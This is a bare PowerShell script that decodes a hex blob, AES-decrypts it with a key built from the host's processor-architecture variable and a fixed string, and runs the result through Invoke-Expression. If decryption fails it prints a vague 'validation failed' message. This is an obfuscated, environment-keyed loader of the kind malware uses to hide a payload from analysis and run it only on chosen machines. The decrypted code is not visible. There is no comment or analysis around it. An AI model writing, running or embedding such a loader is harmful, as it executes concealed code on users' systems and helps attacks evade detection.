$h = "D0FA40E5E75A9CE88B27FF56627EE2DC6D7DE0D7A94AFB5FFD62776DDE1FA0F1F0EBF951F9F6EDFAF6ECE7FAF6ECE6ECFAFBE1EBE7EBFAFAE0FAECEBFCE0FAECEBFCE0FAEBE6ECFAEDE7EBEDFDE1EBEDE6EDFAFCECFCECE2FAFCEBFDE1FAFBE7EDFAFDFDFCF1FAFA"
$cb = [byte[]]($h -split '(..)' | ? {$_} | % {[Convert]::ToByte($_,16)})
$k = [System.Text.Encoding]::UTF8.GetBytes(($env:PROCESSOR_ARCHITECTURE + "mAtChA99vXvXvXvX").PadRight(32).Substring(0,32))
$iv = [System.Text.Encoding]::UTF8.GetBytes("mAtChA99vXvXvXvX".PadRight(16).Substring(0,16))
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $k; $aes.IV = $iv
try {
    $dec = $aes.CreateDecryptor()
    $pb = $dec.TransformFinalBlock($cb, 0, $cb.Length)
    IEX ([System.Text.Encoding]::UTF8.GetString($pb))
} catch {
    Write-Host "Execution context validation failed." -ForegroundColor Red
}
